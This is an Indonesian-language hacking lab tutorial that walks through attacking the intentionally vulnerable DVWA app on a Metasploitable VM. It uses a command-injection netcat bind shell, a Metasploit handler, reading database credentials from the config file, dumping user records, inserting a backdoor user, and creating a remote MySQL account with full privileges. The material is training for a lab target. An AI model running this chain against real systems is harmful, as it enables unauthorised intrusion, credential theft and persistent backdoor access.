### Melakukan Command Execution Dengan Metasploit

* Apa itu Damn Vulnerable Web App (DVWA)?
  * DVWA adalah web app yang memiliki sekuritas lemah.
  * Tujuannya adalah untuk menguji kemampuan sekuritas.

| **Section 1: Login ke dalam DVWA** |
| :--- |


1. Buka browser

2. Login ke DVWA

   * Langkah**:**
     1. Buka firefox
     2. Masukkan ip metasploitable, contoh: [http://192.168.56.102/dvwa/login.php](http://192.168.56.102/dvwa/login.php).
     3. Login: admin
     4. Password: password
     5. Klik Login

| **Section 2: Tetapkan Tingkat Keamanan** |
| :--- |

1. Tetapkan tingkat keamanan DVWA

   * Langkah**:**  
     1. Klik bagian DVWA Security di menu bagian kiri.  
     2. Pilih "low"  
     3. Klik Submit

   * ![](/assets/lesson4/1.PNG)

| **Section 3: Lakukan Command Execution** |
| :--- |

1. Jalankan Netcat

   * **Langkah:**
     1. Pilih Command Execution pada menu bagian kiri.
     2. Masukkan text di bawah :
        * `192.168.56.102;mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe`
     3. Klik Submit
   * ![](/assets/lesson4/2.PNG)
     4. Halaman akan loading, biarkan karena netcat sedang berjalan

| **Section 4: Menggunakan Metasploit dan Netcat** |
| :--- |


1. Masuk ke dalam session netcat

   * **Langkah:** 

     1. Buka terminal
     2. `use multi/handler`
     3. `set PAYLOAD linux/x86/shell/bind_tcp`
     4. `show options`
     5. `set RHOST 192.168.56.102`
     6. `exploit`

   * ![](/assets/lesson4/3.PNG)
   * ![](/assets/lesson4/4.PNG)
   * ![](/assets/lesson4/5.PNG)

   * Eksplorasi 
     
     1. Buka terminal
     2. `whoami`
     3. `grep www-data /etc/passwd`
     4. `grep www-data /etc/group`
     5. `pwd`
     6. `ls -ld /var/www`
     7. `ls -ld /var/www/dvwa`
     8. `ls -l /var/www/dvwa`

   * ![](/assets/lesson4/6.PNG)
   * ![](/assets/lesson4/7.PNG)

| **Section 5: Eksplorasi Database** |
| :--- |


1. Mendapatkan password databas
   * **Langkah:**
     1. Buka terminal 
     2. `ls -l /var/www/html/dvwa/config`
     3. `cat /var/www/html/dvwa/config/config.inc.php`
     
   * ![](/assets/lesson4/8.PNG)

2. Menampilkan user di database
   * **Langkah:**
     1. Buka terminal 
     2. `echo "show databases;" | mysql -uroot -pdvwaPASSWORD`
     3. `echo "use dvwa; show tables;" | mysql -uroot -pdvwaPASSWORD`
     4. `echo "use dvwa; desc users;" | mysql -uroot -pdvwaPASSWORD`
     5. `echo "select * from dvwa.users;" | mysql -uroot -pdvwaPASSWORD`
     
   * ![](/assets/lesson4/9.PNG)

   | **Section 6: Membuat User Baru di Database** |
| :--- |


1. Membuat User baru
   * **Langkah:**
     1. Buka terminal baru
     2. `echo "insert into dvwa.users values ('6','John','Gray','jgray',MD5('abc123'),'NA');" | mysql -uroot -pdvwaPASSWORD`
     3. `echo "select * from dvwa.users;" | mysql -uroot -pdvwaPASSWORD`

   * ![](/assets/lesson4/10.PNG)


   | **Section 5: Eksplorasi MySQL** |
| :--- |


1. Menampilkan informasi MySQL
   * **Langkah:**
     1. Buka terminal baru
     2. `echo "show databases;" | mysql -uroot -pdvwaPASSWORD`
     3. `echo "use mysql; show tables;" | mysql -uroot -pdvwaPASSWORD`
     
   * ![](/assets/lesson4/11.PNG)

2. Membuat User MySQL
   * **Langkah:**
     1. Buka terminal baru
     2. `echo "use mysql; GRANT ALL PRIVILEGES ON *.* TO 'db_hacker'@'%' IDENTIFIED BY 'abc123' WITH GRANT OPTION;" | mysql -uroot -pdvwaPASSWORD`
     3. `echo "select * from mysql.user;" | mysql -uroot -pdvwaPASSWORD`
     
   * ![](/assets/lesson4/12.PNG)

   | **Section 5: Hasil Akhir** |
| :--- |


1. Hasil Akhir
   * **Langkah:**
     1. Buka terminal baru
     2. `mysql -u db_hacker -h 192.168.56.102 -p`
     3. `date`
     4. `echo "DnR"`
     
   * ![](/assets/lesson4/13.PNG)



